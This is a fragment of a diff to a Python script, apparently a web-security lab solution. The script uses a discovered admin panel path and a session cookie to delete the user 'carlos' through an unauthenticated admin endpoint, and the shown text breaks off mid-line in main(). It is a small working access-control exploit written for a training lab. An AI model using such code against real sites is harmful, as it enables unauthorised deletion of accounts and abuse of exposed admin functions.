@@ -21,4 +21,16 @@ def delete_user(url):
     admin_path = re.search("href', '(.*)'", admin_instances).group(1)
 
     # Delete Carlos user
-    
+    cookies = {'session': session_cookie}
+    delete_carlos_url = url + admin_path + '/delete?username=carlos'
+    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
+    if r.status_code == 200:
+        print('(+) Carlos user delete!')
+    else:
+        print('(-) Deletion failed.')
+        print('(-) Exiting script...')
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) !=2:
+        print
